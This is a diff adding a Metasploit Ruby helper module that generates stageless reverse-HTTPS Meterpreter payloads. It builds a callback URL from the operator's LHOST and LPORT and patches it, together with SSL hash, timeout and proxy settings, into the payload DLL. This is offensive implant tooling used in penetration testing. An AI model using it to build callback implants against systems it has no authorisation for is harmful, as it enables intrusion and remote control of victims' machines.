@@ -1,0 +1,73 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+require 'rex/parser/x509_certificate'
+require 'msf/core/payload/uuid_options'
+
+module Msf
+
+##
+#
+# Helper functionality for handling of stageless http(s) payloads
+#
+##
+
+module Handler::ReverseHttp::Stageless
+
+  include Msf::Payload::Windows::VerifySsl
+  include Msf::Payload::UUIDOptions
+
+  def initialize_stageless
+    register_options([
+      OptString.new('EXTENSIONS', [false, "Comma-separated list of extensions to load"]),
+    ], self.class)
+  end
+
+  def generate_stageless(&block)
+    url = "https://#{datastore['LHOST']}:#{datastore['LPORT']}" + generate_uri_uuid_mode(:connect)
+
+    unless block_given?
+      raise ArgumentError, "Stageless generation requires a block argument"
+    end
+
+    # invoke the given function to generate the architecture specific payload
+    block.call(url) do |dll|
+
+      # TODO: figure out this bit
+      # patch the target ID into the URI if specified
+      #if opts[:target_id]
+      #  i = dll.index("/123456789 HTTP/1.0\r\n\r\n\x00")
+      #  if i
+      #    t = opts[:target_id].to_s
+      #    raise "Target ID must be less than 5 bytes" if t.length > 4
+      #    u = "/B#{t} HTTP/1.0\r\n\r\n\x00"
+      #    print_status("Patching Target ID #{t} into DLL")
+      #    dll[i, u.length] = u
+      #  end
+      #end
+
+      verify_cert_hash = get_ssl_cert_hash(datastore['StagerVerifySSLCert'],
+                                           datastore['HandlerSSLCert'])
+
+      Rex::Payloads::Meterpreter::Patch.patch_passive_service!(dll,
+        :url           => url,
+        :ssl           => true,
+        :ssl_cert_hash => verify_cert_hash,
+        :expiration    => datastore['SessionExpirationTimeout'].to_i,
+        :comm_timeout  => datastore['SessionCommunicationTimeout'].to_i,
+        :ua            => datastore['MeterpreterUserAgent'],
+        :proxy_host    => datastore['PayloadProxyHost'],
+        :proxy_port    => datastore['PayloadProxyPort'],
+        :proxy_type    => datastore['PayloadProxyType'],
+        :proxy_user    => datastore['PayloadProxyUser'],
+        :proxy_pass    => datastore['PayloadProxyPass'])
+    end
+
+  end
+
+end
+
+end
